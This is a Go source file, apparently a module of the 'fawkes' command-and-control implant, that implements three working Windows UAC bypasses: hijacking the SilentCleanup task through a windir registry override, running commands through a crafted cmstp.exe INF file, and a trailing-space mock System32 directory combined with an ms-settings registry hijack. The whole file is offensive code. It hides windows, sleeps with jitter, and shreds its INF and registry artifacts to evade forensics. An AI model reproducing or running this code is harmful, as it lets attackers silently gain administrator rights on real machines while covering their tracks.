//go:build windows
// +build windows

package commands

import (
	crand "crypto/rand"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// uacBypassSilentCleanup exploits the SilentCleanup scheduled task which runs
// with highest privileges. The task action uses %windir%\system32\cleanmgr.exe.
// By overriding the windir environment variable in HKCU\Environment, we control
// what gets executed when the task expands the variable.
func uacBypassSilentCleanup(command string) structs.CommandResult {
	var output string
	output += "[*] UAC Bypass Technique: silentcleanup\n"
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	// Step 1: Set HKCU\Environment\windir to hijack the variable expansion.
	output += "[*] Step 1: Setting environment variable override...\n"
	hijackValue := fmt.Sprintf(`cmd /c start "" "%s" &REM `, command)

	envKey, _, err := registry.CreateKey(registry.CURRENT_USER, `Environment`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return errorResult(output + fmt.Sprintf("Error opening HKCU\\Environment: %v", err))
	}

	// Save the original windir value for restoration
	origWindir, _, origErr := envKey.GetStringValue("windir")
	hasOrigWindir := origErr == nil

	if err := envKey.SetStringValue("windir", hijackValue); err != nil {
		envKey.Close()
		return errorResult(output + fmt.Sprintf("Error setting windir override: %v", err))
	}
	envKey.Close()
	output += "[+] Set HKCU\\Environment\\windir override\n"

	// Step 2: Trigger the SilentCleanup scheduled task
	output += "[*] Step 2: Triggering SilentCleanup scheduled task...\n"
	schtasksPath := resolveSystem32Binary("schtasks.exe")
	taskResultBytes, _ := execCmdTimeoutOutput(schtasksPath, "/run", "/tn", `\Microsoft\Windows\DiskCleanup\SilentCleanup`)
	taskResult := string(taskResultBytes)
	if strings.Contains(taskResult, "SUCCESS") || strings.Contains(taskResult, "successfully") {
		output += "[+] SilentCleanup task triggered\n"
	} else {
		output += fmt.Sprintf("[!] Task trigger returned: %s\n", strings.TrimSpace(taskResult))
		output += "[*] Continuing with cleanup (task may still execute)...\n"
	}

	// Step 3: Restore the environment in background goroutine.
	go func() {
		jitterSleep(2*time.Second, 4*time.Second)
		envKey, err = registry.OpenKey(registry.CURRENT_USER, `Environment`, registry.SET_VALUE)
		if err == nil {
			if hasOrigWindir {
				_ = envKey.SetStringValue("windir", origWindir)
			} else {
				_ = envKey.DeleteValue("windir")
			}
			envKey.Close()
		}
	}()

	output += "[*] Environment cleanup scheduled (background)\n\n"
	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// uacBypassCmstp exploits cmstp.exe (Connection Manager Profile Installer) to
// execute commands with elevated privileges via a crafted INF file.
func uacBypassCmstp(command string) structs.CommandResult {
	var output string
	output += "[*] UAC Bypass Technique: cmstp\n"
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	// Step 1: Write a malicious INF file to temp directory
	output += "[*] Step 1: Writing INF file...\n"
	tempDir := os.TempDir()
	infPath := filepath.Join(tempDir, fmt.Sprintf("CMSTP_%s.inf", randomShredString()[:8]))

	infContent := fmt.Sprintf(`[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%%%%11%%%%\scrobj.dll,NI,%s

[Strings]
ServiceName="VPN"
ShortSvcName="VPN"
`, command)

	if err := os.WriteFile(infPath, []byte(infContent), 0600); err != nil {
		return errorResult(output + fmt.Sprintf("Error writing INF file: %v", err))
	}
	output += fmt.Sprintf("[+] INF file written: %s\n", infPath)

	// Step 2: Launch cmstp.exe with the INF file
	output += "[*] Step 2: Launching cmstp.exe...\n"
	cmstpPath := resolveSystem32Binary("cmstp.exe")
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(cmstpPath)
	argsPtr, _ := windows.UTF16PtrFromString("/au " + infPath)
	shellErr := windows.ShellExecute(0, verbPtr, filePtr, argsPtr, nil, 0 /* SW_HIDE */)
	if shellErr != nil {
		// Shred and remove INF file on failure
		shredData := make([]byte, len(infContent)+64)
		_, _ = crand.Read(shredData)
		_ = os.WriteFile(infPath, shredData, 0600)
		_ = os.Remove(infPath)
		return errorResult(output + fmt.Sprintf("Error launching cmstp.exe: %v", shellErr))
	}
	output += "[+] Launched cmstp.exe /au via ShellExecute\n"

	// Step 3: Clean up the INF file
	jitterSleep(2*time.Second, 4*time.Second)
	output += "[*] Step 3: Cleaning up INF file...\n"

	shredData := make([]byte, len(infContent)+64)
	_, _ = crand.Read(shredData)
	_ = os.WriteFile(infPath, shredData, 0600)
	_ = os.Remove(infPath)
	output += "[+] INF file shredded and removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] Note: cmstp.exe may briefly display a UI element — this is expected."

	return successResult(output)
}

// uacBypassWusa exploits the mock trusted directory technique.
// Creates "C:\Windows \System32\" (trailing space) that passes auto-elevation
// path validation, combined with the ms-settings registry hijack.
func uacBypassWusa(command string) structs.CommandResult {
	var output string
	output += "[*] UAC Bypass Technique: wusa (mock trusted directory)\n"
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	windir := os.Getenv("WINDIR")
	if windir == "" {
		windir = os.Getenv("SystemRoot")
	}
	if windir == "" {
		windir = `C:\Windows`
	}

	mockWindowsDir := `\\?\` + windir + ` `
	mockSystem32Dir := mockWindowsDir + `\System32`
	sourceBinary := resolveSystem32Binary("computerdefaults.exe")
	destBinary := windir + ` \System32\computerdefaults.exe`

	// Step 1: Create the mock trusted directory structure
	output += "[*] Step 1: Creating mock trusted directory...\n"
	if err := createDirectoryW(mockWindowsDir); err != nil {
		return errorResult(output + fmt.Sprintf("Error creating mock Windows dir: %v", err))
	}
	output += fmt.Sprintf("[+] Created: %s\n", windir+` `)

	if err := createDirectoryW(mockSystem32Dir); err != nil {
		cleanupWusaDirectory(mockWindowsDir, windir)
		return errorResult(output + fmt.Sprintf("Error creating mock System32 dir: %v", err))
	}
	output += fmt.Sprintf("[+] Created: %s\\System32\n", windir+` `)

	// Step 2: Copy auto-elevating binary
	output += "[*] Step 2: Copying auto-elevating binary to mock directory...\n"
	if err := copyFileSimple(sourceBinary, destBinary); err != nil {
		cleanupWusaDirectory(mockWindowsDir, windir)
		return errorResult(output + fmt.Sprintf("Error copying %s: %v", filepath.Base(sourceBinary), err))
	}
	output += fmt.Sprintf("[+] Copied %s to mock System32\n", filepath.Base(sourceBinary))

	// Step 3: Set up ms-settings registry hijack
	output += "[*] Step 3: Setting ms-settings registry hijack...\n"
	regKeyPath := `Software\Classes\ms-settings\Shell\Open\command`
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
	if err != nil {
		cleanupWusaDirectory(mockWindowsDir, windir)
		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
	}
	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		cleanupWusaDirectory(mockWindowsDir, windir)
		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
	}
	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		key.Close()
		cleanupMsSettingsKey()
		cleanupWusaDirectory(mockWindowsDir, windir)
		return errorResult(output + fmt.Sprintf("Error setting DelegateExecute: %v", err))
	}
	key.Close()
	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)

	// Step 4: Launch from mock directory
	output += "[*] Step 4: Launching from mock directory via ShellExecute...\n"
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(destBinary)
	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
	if err != nil {
		cleanupMsSettingsKey()
		cleanupWusaDirectory(mockWindowsDir, windir)
		return errorResult(output + fmt.Sprintf("Error launching from mock directory: %v", err))
	}
	output += "[+] Launched computerdefaults.exe from mock trusted directory\n"

	// Step 5: Clean up
	jitterSleep(2*time.Second, 4*time.Second)
	output += "[*] Step 5: Cleaning up...\n"
	cleanupMsSettingsKey()
	output += "[+] Registry keys shredded and removed\n"
	cleanupWusaDirectory(mockWindowsDir, windir)
	output += "[+] Mock trusted directory removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// createDirectoryW creates a directory using the Windows API directly,
// supporting \\?\ prefix paths for directory names with trailing spaces.
func createDirectoryW(path string) error {
	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return fmt.Errorf("converting directory path to UTF16: %w", err)
	}
	return windows.CreateDirectory(pathPtr, nil)
}

// copyFileSimple copies a file from src to dst using binary read/write
func copyFileSimple(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return fmt.Errorf("reading source file %s: %w", src, err)
	}
	return os.WriteFile(dst, data, 0755)
}

// cleanupWusaDirectory removes the mock trusted directory tree.
func cleanupWusaDirectory(mockWindowsDir, windir string) {
	destBinary := `\\?\` + windir + ` \System32\computerdefaults.exe`
	removeFileW(destBinary)
	system32Dir := mockWindowsDir + `\System32`
	removeDirectoryW(system32Dir)
	removeDirectoryW(mockWindowsDir)
}

// removeFileW deletes a file using Windows API to support \\?\ prefix paths
func removeFileW(path string) {
	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	_ = windows.DeleteFile(pathPtr)
}

// removeDirectoryW deletes a directory using Windows API to support \\?\ prefix paths
func removeDirectoryW(path string) {
	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	_ = windows.RemoveDirectory(pathPtr)
}
